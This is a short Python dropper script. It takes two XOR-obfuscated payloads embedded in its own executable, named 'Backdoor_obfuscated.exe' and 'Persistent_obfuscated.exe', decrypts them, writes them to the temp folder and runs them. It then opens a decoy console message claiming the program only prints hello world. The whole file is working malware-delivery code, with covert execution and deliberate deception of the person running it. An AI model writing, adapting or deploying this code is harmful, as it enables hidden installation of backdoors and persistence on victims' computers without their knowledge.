import subprocess
import tempfile
import os
import sys

def xor_decrypt(data: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in data])

def extract_and_run(exe_path, start_marker: bytes, end_marker: bytes, filename, key=12):
    with open(exe_path, "rb") as f: 
        full_data = f.read()

    start = full_data.index(start_marker) + len(start_marker)
    end = full_data.index(end_marker)

    encrypted_payload = full_data[start:end]

    decrypted_payload = xor_decrypt(encrypted_payload, key)

    temp_path = os.path.join(tempfile.gettempdir(), filename)
    with open(temp_path, "wb") as f: 
        f.write(decrypted_payload)

    subprocess.Popen(temp_path)

def main():
    exe_path = sys.argv[0]
    key = 12
    
    extract_and_run(exe_path, b'<<<BSTART>>>', b'<<<BEND>>>', "Backdoor_obfuscated.exe", key)
    extract_and_run(exe_path, b'<<<PSTART>>>', b'<<<PEND>>>', "Persistent_obfuscated.exe", key)

    subprocess.Popen(['cmd', '/c', 'echo This literally just prints hello world, I don\'t know what you were expecting? & pause'], creationflags=subprocess.CREATE_NEW_CONSOLE)


if __name__ == "__main__":
    main()



